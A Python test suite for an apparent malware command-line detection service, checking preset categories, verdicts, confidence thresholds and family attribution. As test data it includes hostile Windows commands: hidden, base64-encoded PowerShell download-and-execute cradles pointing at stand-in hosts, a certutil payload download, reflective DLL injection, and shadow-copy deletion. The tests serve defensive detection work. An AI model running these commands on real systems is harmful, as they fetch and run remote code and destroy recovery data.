"""Tests for Command Simulation and Custom Command Analysis Pipeline.

Validates:
- Built-in sample command preset library (structure, 12 categories, 60 presets with 5 per category)
- Arbitrary custom user-entered commands
- Unified pipeline convergence (preset vs custom follow identical backend flow)
- No command-specific hard-coded results
- Full hybrid ML model scoring, confidence fusion (0.60 threshold), and attribution
- Automatic family attribution ONLY when verdict is malicious
- Primary detection vector identification and top evidence generation
"""

from __future__ import annotations

import sys
from pathlib import Path
from collections import Counter

ROOT_DIR = Path(__file__).resolve().parent.parent
if str(ROOT_DIR) not in sys.path:
    sys.path.insert(0, str(ROOT_DIR))

import pytest

from framework.command_samples import BUILTIN_SAMPLE_COMMANDS
from framework.detection_service import DetectionService


@pytest.fixture(scope="module")
def detection_service() -> DetectionService:
    """Instantiate DetectionService with real model artifacts."""
    return DetectionService()


def test_builtin_sample_commands_structure() -> None:
    """Verify built-in sample presets contain 60 scenarios with 5 per category."""
    assert len(BUILTIN_SAMPLE_COMMANDS) >= 60

    required_categories = {
        "Benign Administration",
        "PowerShell Fileless",
        "WMI Malware",
        "Process Hollowing",
        "Reflective DLL Injection",
        "Registry Malware",
        "Cobalt Strike Beacon",
        "Metasploit Memory Payloads",
        "LOLBins Abuse",
        "Fileless Ransomware",
        "Memory-Only RAT",
        "Empire Framework",
    }

    present_categories = {sample["category"] for sample in BUILTIN_SAMPLE_COMMANDS}
    assert required_categories.issubset(present_categories), (
        f"Missing categories: {required_categories - present_categories}"
    )

    counts = Counter(sample["category"] for sample in BUILTIN_SAMPLE_COMMANDS)
    for cat in required_categories:
        assert counts[cat] >= 5, f"Category '{cat}' has fewer than 5 presets: {counts[cat]}"

    for sample in BUILTIN_SAMPLE_COMMANDS:
        assert "id" in sample and sample["id"]
        assert "name" in sample and sample["name"]
        assert "category" in sample and sample["category"]
        assert "command" in sample and sample["command"]
        assert "description" in sample and sample["description"]
        assert "expected_behavior" in sample and sample["expected_behavior"]


def test_preset_and_custom_command_identical_pipeline(detection_service: DetectionService) -> None:
    """Verify preset command and custom command converge into the exact same backend pipeline."""
    sample = BUILTIN_SAMPLE_COMMANDS[0]
    preset_cmd = sample["command"]

    # Analyze as preset command string
    res_preset = detection_service.analyze_command(preset_cmd)

    # Analyze identical command as user-typed string
    res_custom = detection_service.analyze_command(str(preset_cmd))

    assert res_preset["confidence"] == res_custom["confidence"]
    assert res_preset["verdict"] == res_custom["verdict"]
    assert res_preset["classification"] == res_custom["classification"]
    assert res_preset["per_model"] == res_custom["per_model"]
    assert res_preset["primary_detection_vector"] == res_custom["primary_detection_vector"]
    assert res_preset["extracted_features"]["command_length"] == res_custom["extracted_features"]["command_length"]
    assert res_preset["extracted_features"]["shannon_entropy"] == res_custom["extracted_features"]["shannon_entropy"]


def test_arbitrary_user_command_analysis(detection_service: DetectionService) -> None:
    """Verify arbitrary custom user commands evaluate dynamically with complete detection contract."""
    custom_cmds = [
        "Get-Process -Name explorer | Select-Object -Property Id, ProcessName, Handles",
        "powershell.exe -w hidden -enc JABzACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
        "certutil.exe -urlcache -split -f http://10.0.0.5/stage.bin %TEMP%\\stage.bin",
    ]

    for cmd_str in custom_cmds:
        res = detection_service.analyze_command(cmd_str)

        assert "verdict" in res
        assert res["verdict"] in ("benign", "malware")
        assert "classification" in res
        assert res["classification"] in ("BENIGN", "MALICIOUS")
        assert "confidence" in res
        assert 0.0 <= res["confidence"] <= 1.0
        assert "modality_scores" in res
        assert "process" in res["modality_scores"]
        assert "command" in res["modality_scores"]
        assert "network" in res["modality_scores"]
        assert "memory" in res["modality_scores"]
        assert "primary_detection_vector" in res
        assert "dominant_modality" in res
        assert "secondary_modality" in res
        assert "top_evidence" in res
        assert isinstance(res["top_evidence"], list)
        assert len(res["top_evidence"]) > 0

        if res["classification"] == "MALICIOUS":
            assert res["family"] is not None
            assert res["family_confidence"] is not None
        else:
            assert res["family"] is None

        assert "extracted_features" in res
        assert res["extracted_features"]["raw_command_text"] == cmd_str
        assert "observed_telemetry" in res
        assert "lime_tokens" in res
        assert "shap_explanation" in res


def test_benign_vs_malicious_family_attribution_contract(detection_service: DetectionService) -> None:
    """Verify that benign commands do not output malware families, while malicious commands do."""
    benign_cmd = "powershell.exe -Command \"Get-Service | Where-Object {$_.Status -eq 'Running'}\""
    malicious_cmd = "powershell.exe -NoP -Sta -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALgBzAGkAdABlAC8AcABheQBsAG8AYQBkAC4AcABzADEAJwApAA=="

    res_benign = detection_service.analyze_command(benign_cmd)
    res_mal = detection_service.analyze_command(malicious_cmd)

    # Benign assertion
    assert res_benign["classification"] == "BENIGN"
    assert res_benign["family"] is None
    assert res_benign["confidence"] < 0.60

    # Malicious assertion
    assert res_mal["classification"] == "MALICIOUS"
    assert res_mal["family"] is not None
    assert res_mal["confidence"] >= 0.60
    assert res_mal["family_confidence"] > 0.0
    assert len(res_mal["family_probabilities"]) > 0


def test_no_hardcoded_results_differentiation(detection_service: DetectionService) -> None:
    """Verify that distinct commands produce distinct model scores based on features."""
    benign_cmd = "cmd.exe /c dir C:\\Windows\\System32 /s /b"
    suspicious_cmd = "powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALgBzAGkAdABlAC8AcABheQBsAG8AYQBkAC4AcABzADEAJwApAA=="

    res_benign = detection_service.analyze_command(benign_cmd)
    res_susp = detection_service.analyze_command(suspicious_cmd)

    # Entropies must differ based on characters
    assert res_susp["extracted_features"]["shannon_entropy"] > res_benign["extracted_features"]["shannon_entropy"]
    assert res_susp["extracted_features"]["is_base64_encoded"] == 1
    assert res_benign["extracted_features"]["is_base64_encoded"] == 0

    # Suspicious command should have higher fused confidence than benign command
    assert res_susp["confidence"] > res_benign["confidence"]


def test_reflective_dll_and_fileless_ransomware_attribution(
    detection_service: DetectionService,
) -> None:
    """Verify Reflective DLL Injection and Fileless Ransomware classify accurately."""
    reflective_samples = [
        s["command"]
        for s in BUILTIN_SAMPLE_COMMANDS
        if s["family_theme"] == "reflective_dll_injection"
    ] + [
        (
            'powershell.exe -ep bypass -w hidden -c '
            '"Invoke-ReflectivePEInjection -PEBytes $PEBytes -ProcId $PID"'
        ),
        (
            'powershell.exe -NoP -W Hidden -c '
            '"IEX (New-Object Net.WebClient).DownloadString('
            "'http://10.0.0.5/ReflectiveDllInjection.ps1')\""
        ),
    ]
    for cmd_str in reflective_samples:
        res = detection_service.analyze_command(cmd_str)
        assert res["classification"] == "MALICIOUS", cmd_str
        assert res["confidence"] >= 0.60, cmd_str
        assert res["memory_triggered"] is True, cmd_str
        assert res["family"] == "Reflective DLL Injection", (
            cmd_str,
            res["family"],
            res.get("family_probabilities"),
        )

    ransom_samples = [
        s["command"]
        for s in BUILTIN_SAMPLE_COMMANDS
        if s["family_theme"] == "fileless_ransomware"
    ] + [
        (
            'powershell.exe -ep bypass -w hidden -c '
            '"(New-Object Net.WebClient).DownloadString('
            "'http://10.0.0.5/ransom_locker.ps1') | IEX\""
        ),
        "wmic.exe shadowcopy delete",
    ]
    for cmd_str in ransom_samples:
        res = detection_service.analyze_command(cmd_str)
        assert res["classification"] == "MALICIOUS", cmd_str
        assert res["confidence"] >= 0.60, cmd_str
        assert res["memory_triggered"] is True, cmd_str
        assert res["family"] == "Fileless Ransomware", (
            cmd_str,
            res["family"],
            res.get("family_probabilities"),
        )
